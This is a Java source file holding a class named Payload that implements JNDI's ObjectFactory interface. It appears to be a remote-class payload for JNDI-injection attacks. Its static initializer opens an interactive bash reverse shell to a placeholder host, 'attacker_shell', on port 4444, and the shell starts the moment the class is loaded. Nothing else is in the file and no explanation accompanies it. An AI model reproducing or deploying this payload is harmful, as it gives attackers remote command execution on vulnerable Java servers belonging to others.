import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;
import java.io.IOException;

public class Payload implements ObjectFactory {

    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/attacker_shell/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}
